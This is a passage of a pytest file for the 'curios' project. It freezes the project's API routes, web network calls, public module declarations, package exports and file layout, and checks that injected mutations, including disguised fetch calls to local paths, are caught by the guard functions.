    assert M1_AUTHORIZED_CANONICAL_AUTHORITY_BY_TASK["TASK-M1-004"].isdisjoint(
        FROZEN_CONTRACT_PACKAGE_EXPORTS
    )


def test_fastapi_application_route_authority_matches_frozen_boot_m0_inventory() -> None:
    violations = _fastapi_route_authority_violations()

    _assert_no_security_failure(
        not violations,
        f"FastAPI route authority changed: {list(violations)}",
    )


def test_fastapi_known_cognitive_route_bypass_is_executable_but_rejected() -> None:
    from curios_api import create_api_composition, create_application
    from fastapi.testclient import TestClient

    app = create_application(create_api_composition())

    @app.get("/cognitive/intents")
    async def list_intents() -> dict[str, object]:
        return {"intents": []}

    assert TestClient(app).get("/cognitive/intents").json() == {"intents": []}
    assert _fastapi_route_authority_violations(app)


@pytest.mark.parametrize(
    "mutation",
    (
        "cognitive_post",
        "new_method_existing_path",
        "second_path_for_existing_handler",
        "same_path_second_endpoint",
        "add_api_route",
        "api_route_multi_method",
        "included_router",
        "trailing_slash_variant",
        "parameterized_cognitive_path",
    ),
)
def test_fastapi_route_authority_rejects_unowned_route_expansion(mutation: str) -> None:
    from curios_api import create_api_composition, create_application
    from fastapi import APIRouter

    app = create_application(create_api_composition())

    async def handler() -> dict[str, object]:
        return {"ok": True}

    if mutation == "cognitive_post":
        app.post("/cognitive/intents")(handler)
    elif mutation == "new_method_existing_path":
        app.post("/providers")(handler)
    elif mutation == "second_path_for_existing_handler":
        app.get("/provider-list")(handler)
    elif mutation == "same_path_second_endpoint":
        app.get("/providers")(handler)
    elif mutation == "add_api_route":
        app.add_api_route("/cognitive/intents", handler, methods=["GET"])
    elif mutation == "api_route_multi_method":
        app.api_route("/cognitive/intents", methods=["GET", "POST"])(handler)
    elif mutation == "included_router":
        router = APIRouter()
        router.add_api_route("/cognitive/intents", handler, methods=["GET"])
        app.include_router(router)
    elif mutation == "trailing_slash_variant":
        app.get("/providers/")(handler)
    elif mutation == "parameterized_cognitive_path":
        app.get("/cognitive/intents/{intent_id}")(handler)

    assert _fastapi_route_authority_violations(app), mutation


@pytest.mark.parametrize(
    "mutation",
    (
        "remove_required_route",
        "rename_required_route",
        "change_required_method",
    ),
)
def test_fastapi_route_authority_rejects_route_removal_or_mutation(mutation: str) -> None:
    routes = list(FROZEN_FASTAPI_APPLICATION_ROUTES)
    if mutation == "remove_required_route":
        routes = [route for route in routes if route[0] != "/providers"]
    elif mutation == "rename_required_route":
        routes[2] = (
            "/provider-list",
            routes[2][1],
            routes[2][2],
            routes[2][3],
            routes[2][4],
            routes[2][5],
        )
    elif mutation == "change_required_method":
        routes[2] = (
            routes[2][0],
            ("POST",),
            routes[2][2],
            routes[2][3],
            routes[2][4],
            routes[2][5],
        )

    assert _fastapi_route_authority_violations(application_routes=tuple(routes))


def test_web_api_boundary_authority_matches_frozen_boot_m0_inventory() -> None:
    violations = _web_api_boundary_authority_violations(
        (WEB_SOURCE / "apiBoundary.ts").read_text(encoding="utf-8")
    )

    _assert_no_security_failure(
        not violations,
        f"web API boundary authority changed: {list(violations)}",
    )


def test_web_app_authority_matches_frozen_boot_m0_inventory() -> None:
    violations = _web_app_authority_violations((WEB_SOURCE / "App.tsx").read_text(encoding="utf-8"))

    _assert_no_security_failure(
        not violations,
        f"web App authority changed: {list(violations)}",
    )


@pytest.mark.parametrize(
    ("mutation", "snippet"),
    (
        (
            "direct_cognitive_fetch",
            """
            <button onClick={() => void fetch("/cognitive/intents")} type="button">
              Load
            </button>
            """,
        ),
        (
            "computed_global_fetch",
            """
            <button
              onClick={() => {
                const request = globalThis.fetch.bind(globalThis);
                void request(String.fromCharCode(
                  47, 99, 111, 103, 110, 105, 116, 105, 118, 101,
                  47, 105, 110, 116, 101, 110, 116, 115
                ));
              }}
              type="button"
            >
              {String.fromCharCode(
                67, 111, 103, 110, 105, 116, 105, 118, 101,
                32, 73, 110, 116, 101, 110, 116, 115
              )}
            </button>
            """,
        ),
        (
            "aliased_window_fetch",
            """
            <button
              onClick={() => {
                const request = window.fetch;
                void request("/cognitive/intents");
              }}
              type="button"
            >
              Load
            </button>
            """,
        ),
        (
            "computed_member_fetch",
            """
            <button
              onClick={() => {
                const request = window["fetch"];
                void request("/cognitive/intents");
              }}
              type="button"
            >
              Load
            </button>
            """,
        ),
        (
            "websocket",
            """
            <button onClick={() => void new WebSocket("/cognitive/intents")} type="button">
              Load
            </button>
            """,
        ),
        (
            "eventsource",
            """
            <button onClick={() => void new EventSource("/cognitive/intents")} type="button">
              Load
            </button>
            """,
        ),
        (
            "xml_http_request",
            """
            <button
              onClick={() => {
                const request = new XMLHttpRequest();
                request.open("GET", "/cognitive/intents");
                request.send();
              }}
              type="button"
            >
              Load
            </button>
            """,
        ),
        (
            "extra_authorized_capability_button",
            """
            <button onClick={() => void createWork()} type="button">
              Duplicate
            </button>
            """,
        ),
        (
            "form_submit_authority",
            """
            <form onSubmit={() => void runWork()}>
              <button type="submit">Submit</button>
            </form>
            """,
        ),
        (
            "anchor_authority",
            """
            <a onClick={() => void refreshWork()}>
              Refresh elsewhere
            </a>
            """,
        ),
    ),
)
def test_web_app_authority_rejects_premature_network_and_control_surface(
    mutation: str,
    snippet: str,
) -> None:
    source = (WEB_SOURCE / "App.tsx").read_text(encoding="utf-8")
    insertion_point = "      {consoleState.lastFailure === null ? null : ("
    assert insertion_point in source
    mutated_source = source.replace(
        insertion_point,
        f"{textwrap.indent(textwrap.dedent(snippet).strip(), '      ')}\n\n{insertion_point}",
        1,
    )

    assert _web_app_authority_violations(mutated_source), mutation


def test_web_app_authority_allows_presentation_copy_without_new_control_capability() -> None:
    source = (WEB_SOURCE / "App.tsx").read_text(encoding="utf-8")
    mutated_source = source.replace("Create Work", "Start Work", 1).replace(
        "M0 Work Console",
        "M0 Operations Console",
        1,
    )

    assert not _web_app_authority_violations(mutated_source)


def test_web_app_authority_allows_handler_rename_without_capability_change() -> None:
    source = (WEB_SOURCE / "App.tsx").read_text(encoding="utf-8")
    mutated_source = source.replace("async function createWork()", "async function createM0Work()")
    mutated_source = mutated_source.replace("void createWork()", "void createM0Work()")

    assert not _web_app_authority_violations(mutated_source)


@pytest.mark.parametrize(
    "mutation",
    (
        "new_cognitive_api_function",
        "generic_cognitive_api_function",
        "computed_existing_path_mutation",
        "changed_method",
        "arbitrary_backend_path",
        "websocket",
        "eventsource",
    ),
)
def test_web_api_boundary_authority_rejects_premature_backend_surface(
    mutation: str,
) -> None:
    source = (WEB_SOURCE / "apiBoundary.ts").read_text(encoding="utf-8")
    mutations = {
        "new_cognitive_api_function": source
        + "\nexport async function listIntents(): Promise<ApiResult<unknown>> {\n"
        + '  return requestJson("/cognitive/intents" as ApiBoundaryPath);\n'
        + "}\n",
        "generic_cognitive_api_function": source
        + "\nexport async function loadRecords(): Promise<ApiResult<unknown>> {\n"
        + '  return requestJson("/cognitive/intents" as ApiBoundaryPath);\n'
        + "}\n",
        "computed_existing_path_mutation": source.replace(
            'requestJson<WorkResponse>("/work/provider-inventory"',
            "requestJson<WorkResponse>(String.fromCharCode("
            "47, 99, 111, 103, 110, 105, 116, 105, 118, 101, "
            "47, 105, 110, 116, 101, 110, 116, 115)",
            1,
        ),
        "changed_method": source.replace('method: "POST"', 'method: "DELETE"', 1),
        "arbitrary_backend_path": source
        + "\nexport async function adminTools(): Promise<ApiResult<unknown>> {\n"
        + '  return requestJson("/admin/tools" as ApiBoundaryPath);\n'
        + "}\n",
        "websocket": source + '\nconst socket = new WebSocket("/cognitive/intents");\n',
        "eventsource": source + '\nconst source = new EventSource("/cognitive/intents");\n',
    }

    assert _web_api_boundary_authority_violations(mutations[mutation]), mutation


@pytest.mark.parametrize(
    ("source_root", "expected_declarations_by_module", "expected_class_members_by_module"),
    (
        (CORE_SOURCE, FROZEN_CORE_DECLARATIONS_BY_MODULE, FROZEN_CORE_CLASS_MEMBERS_BY_MODULE),
        (
            RUNTIME_SOURCE,
            FROZEN_RUNTIME_DECLARATIONS_BY_MODULE,
            FROZEN_RUNTIME_CLASS_MEMBERS_BY_MODULE,
        ),
    ),
)
def test_core_runtime_existing_module_authority_matches_frozen_inventory(
    source_root: Path,
    expected_declarations_by_module: dict[str, tuple[tuple[str, str], ...]],
    expected_class_members_by_module: dict[str, dict[str, tuple[tuple[str, str], ...]]],
) -> None:
    actual_modules = {
        path.relative_to(source_root).as_posix()
        for path in source_root.rglob("*.py")
        if path.name != "py.typed"
    }
    assert actual_modules == set(expected_declarations_by_module)
    violations = tuple(
        violation
        for module_name in sorted(expected_declarations_by_module)
        for violation in _core_runtime_module_authority_violations(
            source_root,
            module_name,
            (source_root / module_name).read_text(encoding="utf-8"),
            expected_declarations_by_module,
            expected_class_members_by_module,
        )
    )

    _assert_no_security_failure(
        not violations,
        f"core/runtime public authority changed: {list(violations)}",
    )


@pytest.mark.parametrize(
    ("source_root", "module_name", "snippet"),
    (
        (
            RUNTIME_SOURCE,
            "single_step_runtime.py",
            """

            def decompose_intent() -> object:
                return object()
            """,
        ),
        (
            RUNTIME_SOURCE,
            "work_repository.py",
            """

            DAG_SCHEDULER_AUTHORITY: tuple[str, ...] = ("DAG",)
            """,
        ),
        (
            RUNTIME_SOURCE,
            "provider_inventory_executor.py",
            """

            class CapabilityResolver:
                pass
            """,
        ),
        (
            CORE_SOURCE,
            "application.py",
            """

            def route_model_profile() -> object:
                return object()
            """,
        ),
        (
            CORE_SOURCE,
            "ports/providers.py",
            """

            class AgentAssignmentPort:
                pass
            """,
        ),
    ),
)
def test_core_runtime_existing_files_reject_premature_public_semantic_authority(
    source_root: Path,
    module_name: str,
    snippet: str,
) -> None:
    source = (source_root / module_name).read_text(encoding="utf-8")
    mutated_source = f"{source}\n{textwrap.dedent(snippet)}"
    expected_declarations = (
        FROZEN_CORE_DECLARATIONS_BY_MODULE
        if source_root == CORE_SOURCE
        else FROZEN_RUNTIME_DECLARATIONS_BY_MODULE
    )
    expected_members = (
        FROZEN_CORE_CLASS_MEMBERS_BY_MODULE
        if source_root == CORE_SOURCE
        else FROZEN_RUNTIME_CLASS_MEMBERS_BY_MODULE
    )

    assert _core_runtime_module_authority_violations(
        source_root,
        module_name,
        mutated_source,
        expected_declarations,
        expected_members,
    )


@pytest.mark.parametrize(
    ("source_root", "module_name", "original", "replacement"),
    (
        (
            RUNTIME_SOURCE,
            "single_step_runtime.py",
            "    def run_once("
            "self, request: SingleStepRuntimeRequest"
            ") -> SingleStepRuntimeResult:\n",
            "    def run_dag(self) -> object:\n"
            "        return object()\n\n"
            "    def run_once("
            "self, request: SingleStepRuntimeRequest"
            ") -> SingleStepRuntimeResult:\n",
        ),
        (
            CORE_SOURCE,
            "application.py",
            "    def list_provider_descriptors(\n",
            "    def assign_agent(self) -> object:\n"
            "        return object()\n\n"
            "    def list_provider_descriptors(\n",
        ),
    ),
)
def test_core_runtime_existing_classes_reject_new_public_methods(
    source_root: Path,
    module_name: str,
    original: str,
    replacement: str,
) -> None:
    source = (source_root / module_name).read_text(encoding="utf-8")
    assert original in source
    mutated_source = source.replace(original, replacement, 1)
    expected_declarations = (
        FROZEN_CORE_DECLARATIONS_BY_MODULE
        if source_root == CORE_SOURCE
        else FROZEN_RUNTIME_DECLARATIONS_BY_MODULE
    )
    expected_members = (
        FROZEN_CORE_CLASS_MEMBERS_BY_MODULE
        if source_root == CORE_SOURCE
        else FROZEN_RUNTIME_CLASS_MEMBERS_BY_MODULE
    )

    assert _core_runtime_module_authority_violations(
        source_root,
        module_name,
        mutated_source,
        expected_declarations,
        expected_members,
    )


def test_curios_contracts_canonical_declarations_match_frozen_inventory() -> None:
    actual_modules = {
        path.relative_to(CONTRACTS_SOURCE).as_posix()
        for path in CONTRACTS_SOURCE.glob("*.py")
        if path.name not in {"__init__.py"}
    }
    assert actual_modules == set(FROZEN_CONTRACT_DECLARATIONS_BY_MODULE)

    violations = tuple(
        violation
        for module_name in sorted(FROZEN_CONTRACT_DECLARATIONS_BY_MODULE)
        for violation in _contract_module_authority_violations(
            module_name,
            (CONTRACTS_SOURCE / module_name).read_text(encoding="utf-8"),
        )
    )

    _assert_no_security_failure(
        not violations,
        f"curios_contracts canonical declaration inventory changed: {list(violations)}",
    )


def test_curios_contracts_package_exports_match_frozen_inventory() -> None:
    violations = _contract_init_authority_violations(
        (CONTRACTS_SOURCE / "__init__.py").read_text(encoding="utf-8")
    )

    _assert_no_security_failure(
        not violations,
        f"curios_contracts package public export inventory changed: {list(violations)}",
    )


@pytest.mark.parametrize(
    ("module_name", "snippet"),
    (
        (
            "work.py",
            """

            @dataclass(frozen=True, slots=True)
            class Intent:
                intent_id: WorkId
            """,
        ),
        (
            "executions.py",
            """

            class Objective:
                pass
            """,
        ),
        (
            "security.py",
            """

            class Problem(StrEnum):
                UNKNOWN = "UNKNOWN"
            """,
        ),
        (
            "providers.py",
            """

            class Assumption(Protocol):
                pass
            """,
        ),
        (
            "references.py",
            """

            Decision: TypeAlias = ObjectReference
            """,
        ),
        (
            "capabilities.py",
            """

            Plan = NewType("Plan", str)
            """,
        ),
        (
            "work.py",
            """

            COGNITIVE_GRAPH_RECORD_VALUES: tuple[str, ...] = ("INTENT",)
            """,
        ),
        (
            "serialization.py",
            """

            def make_intent() -> object:
                return object()
            """,
        ),
    ),
)
def test_curios_contracts_existing_files_reject_new_public_canonical_declarations(
    module_name: str,
    snippet: str,
) -> None:
    source = (CONTRACTS_SOURCE / module_name).read_text(encoding="utf-8")
    mutated_source = f"{source}\n{textwrap.dedent(snippet)}"

    assert _contract_module_authority_violations(module_name, mutated_source)


@pytest.mark.parametrize(
    ("module_name", "original", "replacement"),
    (
        (
            "work.py",
            "    evidence_requirement_refs: tuple[ObjectReference, ...] = ()\n",
            "    evidence_requirement_refs: tuple[ObjectReference, ...] = ()\n"
            "    intent: str | None = None\n",
        ),
        (
            "security.py",
            '    EXECUTION = "EXECUTION"\n',
            '    EXECUTION = "EXECUTION"\n    COGNITIVE_AUTHORITY = "COGNITIVE_AUTHORITY"\n',
        ),
        (
            "security.py",
            "    secret_provider_ref: ObjectReference | None = None\n",
            "    secret_provider_ref: ObjectReference | None = None\n"
            "    intent_ref: ObjectReference | None = None\n",
        ),
        (
            "references.py",
            "    ref_id: CuriosId\n",
            "    ref_id: CuriosId\n    graph_id: str | None = None\n",
        ),
    ),
)
def test_curios_contracts_existing_schema_and_vocabularies_reject_public_mutations(
    module_name: str,
    original: str,
    replacement: str,
) -> None:
    source = (CONTRACTS_SOURCE / module_name).read_text(encoding="utf-8")
    assert original in source
    mutated_source = source.replace(original, replacement, 1)

    assert _contract_module_authority_violations(module_name, mutated_source)


def test_curios_contracts_reject_duplicate_generic_reference_declaration() -> None:
    source = (CONTRACTS_SOURCE / "references.py").read_text(encoding="utf-8")
    mutated_source = source + textwrap.dedent(
        """

        @dataclass(frozen=True, slots=True)
        class GenericReference:
            kind: str
            ref_id: str
        """
    )

    assert _contract_module_authority_violations("references.py", mutated_source)


@pytest.mark.parametrize(
    "mutation",
    (
        "unsafe_alias_before_legitimate_import",
        "unsafe_alias_after_legitimate_import",
        "unsafe_alias_between_legitimate_imports",
        "duplicate_module_import_one_unsafe",
        "duplicate_module_import_three_times_middle_unsafe",
        "unsafe_alias_mixed_into_legitimate_import",
        "safe_frozen_import_duplicated_unexpectedly",
        "duplicate_import_changed_alias",
        "star_import",
        "plain_import_as_public_alias",
        "from_import_then_public_assignment_alias",
        "plain_import_then_public_assignment_alias",
        "other_module_existing_symbol_under_new_public_name",
    ),
)
def test_curios_contracts_init_rejects_lossy_import_and_alias_edge_cases(
    mutation: str,
) -> None:
    source = (CONTRACTS_SOURCE / "__init__.py").read_text(encoding="utf-8")
    work_import = (
        "from curios_contracts.work import WORK_ITEM_STATE_VALUES, WorkItem, WorkItemState\n"
    )
    evidence_import = (
        "from curios_contracts.evidence import EVIDENCE_KIND_VALUES, "
        "EvidenceKind, EvidenceReference\n"
    )
    mutations = {
        "unsafe_alias_before_legitimate_import": (
            "from curios_contracts.work import WorkItem as Intent\n" + source
        ),
        "unsafe_alias_after_legitimate_import": source.replace(
            work_import,
            f"{work_import}from curios_contracts.work import WorkItem as Intent\n",
        ),
        "unsafe_alias_between_legitimate_imports": source.replace(
            evidence_import,
            f"from curios_contracts.work import WorkItem as Intent\n{evidence_import}",
        ),
        "duplicate_module_import_one_unsafe": source.replace(
            work_import,
            f"from curios_contracts.work import WorkItem as Objective\n{work_import}",
        ),
        "duplicate_module_import_three_times_middle_unsafe": source.replace(
            work_import,
            (
                "from curios_contracts.work import WorkItem\n"
                "from curios_contracts.work import WorkItem as AnythingPublic\n"
                f"{work_import}"
            ),
        ),
        "unsafe_alias_mixed_into_legitimate_import": source.replace(
            work_import,
            (
                "from curios_contracts.work import WORK_ITEM_STATE_VALUES, "
                "WorkItem as AnythingPublic, WorkItemState\n"
            ),
        ),
        "safe_frozen_import_duplicated_unexpectedly": source.replace(
            work_import,
            f"{work_import}{work_import}",
        ),
        "duplicate_import_changed_alias": source.replace(
            work_import,
            (
                "from curios_contracts.work import WORK_ITEM_STATE_VALUES, "
                "WorkItem as WorkItem, WorkItemState\n"
            ),
        ),
        "star_import": source.replace(
            work_import,
            "from curios_contracts.work import *\n",
        ),
        "plain_import_as_public_alias": f"import curios_contracts.work as Intent\n{source}",
        "from_import_then_public_assignment_alias": source.replace(
            work_import,
            f"from curios_contracts.work import WorkItem\nIntent = WorkItem\n{work_import}",
        ),
        "plain_import_then_public_assignment_alias": (
            f"import curios_contracts.work\nIntent = curios_contracts.work.WorkItem\n{source}"
        ),
        "other_module_existing_symbol_under_new_public_name": (
            "from curios_contracts.providers import ProviderDescriptor as ModelProfile\n" + source
        ),
    }

    assert _contract_init_authority_violations(mutations[mutation])


@pytest.mark.parametrize(
    "mutation",
    (
        "conditional_alias_import_true",
        "conditional_alias_import_name",
        "conditional_alias_assignment",
        "type_checking_alias_import",
        "try_alias_import",
        "try_alias_assignment",
        "try_finally_nested_import",
        "with_block",
        "for_loop",
        "while_loop",
        "match_block",
        "nested_function_import",
        "nested_class_import",
        "getattr_dynamic_export",
        "dir_dynamic_export",
        "globals_assignment",
        "globals_update",
        "setattr_export",
        "locals_assignment",
        "vars_assignment",
        "exec_export",
        "eval_export",
        "extra_public_assignment",
        "extra_private_assignment",
        "annotated_assignment",
        "tuple_assignment",
        "all_append",
        "all_extend",
        "all_reassignment",
        "dynamic_all_construction",
        "unexpected_plain_import",
        "star_import",
        "delete_statement",
        "raise_statement",
        "assert_statement",
        "global_statement",
    ),
)
def test_curios_contracts_init_rejects_unexpected_executable_statement_shapes(
    mutation: str,
) -> None:
    source = (CONTRACTS_SOURCE / "__init__.py").read_text(encoding="utf-8")
    work_import = (
        "from curios_contracts.work import WORK_ITEM_STATE_VALUES, WorkItem, WorkItemState\n"
    )
    mutations = {
        "conditional_alias_import_true": (
            "if True:\n    from curios_contracts.work import WorkItem as Intent\n" + source
        ),
        "conditional_alias_import_name": (
            "if some_condition:\n    from curios_contracts.work import WorkItem as Intent\n"
            + source
        ),
        "conditional_alias_assignment": (
            f"{work_import}if True:\n    Intent = WorkItem\n" + source.replace(work_import, "")
        ),
        "type_checking_alias_import": (
            "if TYPE_CHECKING:\n    from curios_contracts.work import WorkItem as Intent\n" + source
        ),
        "try_alias_import": (
            "try:\n    from curios_contracts.work import WorkItem as Intent\n"
            "except ImportError:\n    pass\n" + source
        ),
        "try_alias_assignment": (
            f"{work_import}try:\n    Intent = WorkItem\nexcept Exception:\n    pass\n"
            + source.replace(work_import, "")
        ),
        "try_finally_nested_import": (
            "try:\n    pass\nfinally:\n    from curios_contracts.work import WorkItem as Intent\n"
            + source
        ),
        "with_block": (
            "with open(__file__, encoding='utf-8') as _file:\n    Intent = _file\n" + source
        ),
        "for_loop": "for _item in ():\n    Intent = _item\n" + source,
        "while_loop": "while False:\n    Intent = WorkItem\n" + source,
        "match_block": "match 'Intent':\n    case _:\n        Intent = None\n" + source,
        "nested_function_import": (
            "def _load_intent():\n"
            "    from curios_contracts.work import WorkItem as Intent\n"
            "    return Intent\n" + source
        ),
        "nested_class_import": (
            "class _IntentFactory:\n"
            "    from curios_contracts.work import WorkItem as Intent\n" + source
        ),
        "getattr_dynamic_export": (
            source + "\ndef __getattr__(name: str):\n"
            "    if name == 'Intent':\n"
            "        return WorkItem\n"
            "    raise AttributeError(name)\n"
        ),
        "dir_dynamic_export": source + "\ndef __dir__():\n    return ['Intent']\n",
        "globals_assignment": (
            f"{work_import}globals()['Intent'] = WorkItem\n" + source.replace(work_import, "")
        ),
        "globals_update": (
            f"{work_import}globals().update({{'Intent': WorkItem}})\n"
            + source.replace(work_import, "")
        ),
        "setattr_export": (
            "import sys\n"
            f"{work_import}setattr(sys.modules[__name__], 'Intent', WorkItem)\n"
            + source.replace(work_import, "")
        ),
        "locals_assignment": (
            f"{work_import}locals()['Intent'] = WorkItem\n" + source.replace(work_import, "")
        ),
        "vars_assignment": (
            f"{work_import}vars()['Intent'] = WorkItem\n" + source.replace(work_import, "")
        ),
        "exec_export": 'exec("Intent = object()")\n' + source,
        "eval_export": 'eval("1")\n' + source,
        "extra_public_assignment": source.replace(
            '__version__ = "0.0.0"\n',
            '__version__ = "0.0.0"\nIntent = WorkItem\n',
        ),
        "extra_private_assignment": source.replace(
            '__version__ = "0.0.0"\n',
            '__version__ = "0.0.0"\n_intent = WorkItem\n',
        ),
        "annotated_assignment": source.replace(
            '__version__ = "0.0.0"\n',
            '__version__ = "0.0.0"\nIntent: object = WorkItem\n',
        ),
        "tuple_assignment": source.replace(
            '__version__ = "0.0.0"\n',
            '__version__ = "0.0.0"\nIntent, Objective = WorkItem, WorkItem\n',
        ),
        "all_append": source + "\n__all__.append('Intent')\n",
        "all_extend": source + "\n__all__.extend(('Intent',))\n",
        "all_reassignment": source.replace(
            "__all__ = (",
            "__all__ = ('Intent',)\n__all__ = (",
        ),
        "dynamic_all_construction": source.replace(
            "__all__ = (",
            "__all__ = tuple(['Intent'])\n__all__ = (",
        ),
        "unexpected_plain_import": "import curios_contracts.work\n" + source,
        "star_import": source.replace(
            work_import,
            "from curios_contracts.work import *\n",
        ),
        "delete_statement": "del __all__\n" + source,
        "raise_statement": "raise RuntimeError('nope')\n" + source,
        "assert_statement": "assert True\n" + source,
        "global_statement": "global Intent\n" + source,
    }

    assert _contract_init_authority_violations(mutations[mutation])


@pytest.mark.parametrize(
    "replacement",
    (
        '"""Curios-owned canonical contract package boundary."""\n\n',
        "'Curios-owned canonical contract package boundary.'\n\n",
        '"""Harmless package boundary documentation rewrite."""\n\n',
    ),
)
def test_curios_contracts_init_allows_harmless_docstring_formatting(
    replacement: str,
) -> None:
    source = (CONTRACTS_SOURCE / "__init__.py").read_text(encoding="utf-8")
    mutated_source = source.replace(
        '"""Curios-owned canonical contract package boundary."""\n\n',
        replacement,
        1,
    )

    assert not _contract_init_authority_violations(mutated_source)


@pytest.mark.parametrize(
    "mutation",
    (
        "new_intent_import_and_export",
        "new_declaration_without_all",
        "reexport_new_symbol_from_existing_module",
        "alias_existing_symbol_under_new_public_name",
        "alias_existing_symbol_without_all",
        "all_addition_without_authority",
        "alias_import_plus_all_addition",
        "new_private_helper_reexport",
    ),
)
def test_curios_contracts_package_exports_reject_public_authority_expansion(
    mutation: str,
) -> None:
    source = (CONTRACTS_SOURCE / "__init__.py").read_text(encoding="utf-8")
    mutations = {
        "new_intent_import_and_export": source.replace(
            "from curios_contracts.work import WORK_ITEM_STATE_VALUES, WorkItem, WorkItemState",
            (
                "from curios_contracts.work import WORK_ITEM_STATE_VALUES, "
                "Intent, WorkItem, WorkItemState"
            ),
        ).replace(
            '    "IntegrityDescriptor",\n',
            '    "IntegrityDescriptor",\n    "Intent",\n',
        ),
        "new_declaration_without_all": source + "\nclass Intent:\n    pass\n",
        "reexport_new_symbol_from_existing_module": source
        + "\nfrom curios_contracts.work import Intent\n",
        "alias_existing_symbol_under_new_public_name": source.replace(
            "from curios_contracts.work import WORK_ITEM_STATE_VALUES, WorkItem, WorkItemState",
            (
                "from curios_contracts.work import WORK_ITEM_STATE_VALUES, "
                "WorkItem as Intent, WorkItemState"
            ),
        ).replace(
            '    "IntegrityDescriptor",\n',
            '    "IntegrityDescriptor",\n    "Intent",\n',
        ),
        "alias_existing_symbol_without_all": source.replace(
            "from curios_contracts.work import WORK_ITEM_STATE_VALUES, WorkItem, WorkItemState",
            (
                "from curios_contracts.work import WORK_ITEM_STATE_VALUES, "
                "WorkItem as Intent, WorkItemState"
            ),
        ),
        "all_addition_without_authority": source.replace(
            '    "IntegrityDescriptor",\n',
            '    "IntegrityDescriptor",\n    "Intent",\n',
        ),
        "alias_import_plus_all_addition": (
            "from curios_contracts.work import WorkItem as Intent\n" + source
        ).replace(
            '    "IntegrityDescriptor",\n',
            '    "IntegrityDescriptor",\n    "Intent",\n',
        ),
        "new_private_helper_reexport": source
        + "\nfrom curios_contracts._validation import validate_safe_token as Intent\n",
    }

    assert _contract_init_authority_violations(mutations[mutation])


def test_curios_contracts_private_module_helpers_remain_allowed_when_not_public_authority() -> None:
    source = (CONTRACTS_SOURCE / "work.py").read_text(encoding="utf-8")
    mutated_source = source + textwrap.dedent(
        """

        def _normalize_intent_probe(value: object) -> object:
            return value
        """
    )

    assert not _contract_module_authority_violations(
        "work.py",
        mutated_source,
    )


@pytest.mark.parametrize(
    "contracts_file",
    (
        "intent.py",
        "cognitive_graph.py",
        "work_dag.py",
        "routing.py",
        "model_profiles.py",
        "agents/m1_lifecycle.py",
    ),
)
def test_m1_contract_topology_rejects_premature_canonical_authority(
    contracts_file: str,
) -> None:
    simulated_files = ALLOWED_CONTRACTS_SOURCE_FILES | {contracts_file}

    assert _unauthorized_contracts_source_files(simulated_files) == {contracts_file}


@pytest.mark.parametrize(
    "typescript_contracts_file",
    (
        "intent.ts",
        "cognitiveGraph.ts",
        "workDag.ts",
        "routing.ts",
    ),
)
def test_m1_typescript_contract_topology_rejects_premature_canonical_authority(
    typescript_contracts_file: str,
) -> None:
    simulated_files = ALLOWED_TYPESCRIPT_CONTRACTS_SOURCE_FILES | {typescript_contracts_file}

    assert _unauthorized_typescript_contracts_source_files(simulated_files) == {
        typescript_contracts_file
    }


@pytest.mark.parametrize(
    "runtime_file",
    (
        "scheduler.py",
        "arbitrary_tool_executor.py",
        "model_router.py",
        "agent_runtime.py",
        "services/workflow.py",
        "m1_dag_records.py",
        "m1_agent_repository.py",
        "m1_agent_lifecycle.py",
        "m1_executor_seam.py",
        "m1_model_profiles.py",
        "m1_routing_decisions.py",
        "m1_bounded_dag_runner.py",
        "m1_verification_loop.py",
    ),
)
def test_m0_runtime_module_topology_rejects_unvalidated_future_runtime_surfaces(
    runtime_file: str,
) -> None:
    simulated_files = M0_AUTHORIZED_RUNTIME_SOURCE_FILES | {runtime_file}

    assert _unauthorized_runtime_source_files(simulated_files) == {runtime_file}


@pytest.mark.parametrize(
    "api_file",
    (
        "agents.py",
        "scheduler_routes.py",
        "model_routes.py",
        "work_console.py",
        "routes/provider_tools.py",
        "m1_cognitive_loop.py",
        "routes/m1_intents.py",
        "routes/m1_dags.py",
        "routes/m1_agents.py",
        "routes/m1_routing.py",
        "routes/m1_verification.py",
    ),
)
def test_m0_api_source_topology_rejects_unvalidated_future_api_surfaces(
    api_file: str,
) -> None:
    simulated_files = M0_AUTHORIZED_API_SOURCE_FILES | {api_file}

    assert _unauthorized_api_source_files(simulated_files) == {api_file}


@pytest.mark.parametrize(
    "api_test_file",
    (
        "test_agent_runtime_endpoints.py",
        "test_scheduler_routes.py",
        "test_model_generation_api.py",
        "test_m1_cognitive_loop_endpoints.py",
        "test_m1_intent_routes.py",
    ),
)
def test_m0_api_test_topology_rejects_unvalidated_future_api_tests(
    api_test_file: str,
) -> None:
    simulated_files = M0_AUTHORIZED_API_TEST_FILES | {api_test_file}

    assert _unauthorized_api_test_files(simulated_files) == {api_test_file}


@pytest.mark.parametrize(
    "web_file",
    (
        "AgentConsole.tsx",
        "DagEditor.tsx",
        "DataLab.tsx",
        "ModelRouter.tsx",
        "SchedulerView.tsx",
        "ToolRunner.tsx",
        "routes/AdminPage.tsx",
        "M1CognitiveLoop.tsx",
        "M1DagView.tsx",
        "M1AgentPanel.tsx",
        "M1RoutingView.tsx",
        "M1VerificationPanel.tsx",
    ),
)
def test_m0_web_source_topology_rejects_unvalidated_future_web_surfaces(
    web_file: str,
) -> None:
    simulated_files = M0_AUTHORIZED_WEB_SOURCE_FILES | {web_file}

    assert _unauthorized_web_source_files(simulated_files) == {web_file}


@pytest.mark.parametrize(
    "integration_file",
    (
        "tests/integration/test_m0_scheduler_integration.py",
        "tests/integration/test_m0_agent_runtime_integration.py",
        "tests/integration/test_m0_model_router_integration.py",
        "tests/integration/test_m0_datalab_integration.py",
        "tests/integration/test_m0_acceptance_suite.py",
        "tests/integration/test_m1_cognitive_loop_integration.py",
        "tests/integration/test_m1_parallel_runner_integration.py",
        "tests/integration/test_m1_model_profile_integration.py",
    ),
)
def test_m0_integration_topology_rejects_unvalidated_future_integration_surfaces(
    integration_file: str,
) -> None:
    simulated_files = (
        AUTHORIZED_BOOT019_INTEGRATION_TESTS | AUTHORIZED_M0_INTEGRATION_TESTS | {integration_file}
    )

    assert _unauthorized_integration_tests(simulated_files) == {integration_file}


@pytest.mark.parametrize(
    "acceptance_file",
    (
        "tests/acceptance/test_m0_scheduler_acceptance.py",
        "tests/acceptance/test_m0_agent_runtime_acceptance.py",
        "tests/acceptance/test_m0_model_router_acceptance.py",
        "tests/acceptance/test_m0_datalab_acceptance.py",
        "tests/acceptance/test_m0_final_freeze.py",
        "tests/acceptance/test_m1_cognitive_loop_acceptance.py",
        "tests/acceptance/test_m1_final_freeze.py",
    ),
)
